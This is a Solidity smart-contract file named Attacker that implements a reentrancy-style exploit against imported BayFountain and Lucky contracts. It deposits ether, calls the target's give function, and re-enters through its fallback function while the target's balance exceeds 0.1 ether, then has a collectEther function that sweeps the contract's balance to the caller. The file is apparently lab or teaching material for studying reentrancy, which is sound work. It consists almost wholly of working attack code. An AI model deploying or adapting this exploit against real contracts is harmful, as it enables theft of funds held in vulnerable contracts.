pragma solidity >=0.7.0 <0.8.0;

import "BayFountain.sol";
import "Lucky.sol";


contract Attacker 
{
    
    
    BayFountain  bayFountain;
    Lucky lucky;
    
    // intialize the etherStore variable with the contract address
    constructor  (address payable _bayFountainAddress, address payable _lucky ) 
    {
        bayFountain = BayFountain(_bayFountainAddress);
        lucky = Lucky(_lucky);
    
    }


    function attackBayFountain() public payable 
    {
        
        // attack to the nearest ether
       // require(msg.value >= 1 ether);
        
       
        bayFountain.add{value: 1 ether}();
       
        // start the magic
        if(address(bayFountain).balance > 0.1 ether) {
            bayFountain.give(address(lucky));
        }
    }

    function attackGive() public payable {
        if(address(bayFountain).balance > 0.1 ether) {
            bayFountain.give(address(lucky));
        }
        
    }

    function collectEther() public 
    {
        msg.sender.transfer(address(this).balance);
    }

    // fallback function - where the magic happens
    fallback () external payable 
    {
        if (address(bayFountain).balance > 0.1 ether) 
        {
            bayFountain.give(address(lucky));
        }
    }
    
    function getBalance() public view returns(uint){
       return address(this).balance;
   }
    
}